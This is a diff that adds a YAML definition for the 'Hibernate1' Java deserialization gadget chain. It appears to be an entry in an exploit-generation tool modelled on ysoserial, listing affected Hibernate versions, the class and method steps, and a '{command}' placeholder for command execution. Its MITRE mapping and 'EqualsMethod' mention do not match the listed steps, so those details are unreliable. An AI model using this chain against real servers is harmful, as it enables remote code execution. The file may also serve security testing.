@@ -1,0 +1,24 @@
+name: "Hibernate1"
+category: "hibernate"
+description: "Hibernate1 gadget chain using TypedValue and EqualsMethod"
+jdk_version: "all"
+dependencies:
+  - name: "hibernate-core"
+    version: "4.0-5.0"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.hibernate.engine.spi.TypedValue"
+    method_name: "hashCode"
+    parameters: []
+  - class_name: "org.hibernate.tuple.component.AbstractComponentTuplizer"
+    method_name: "getPropertyValue"
+    parameters: []
+  - class_name: "org.hibernate.property.access.spi.GetterMethodImpl"
+    method_name: "get"
+    parameters:
+      - "{command}"
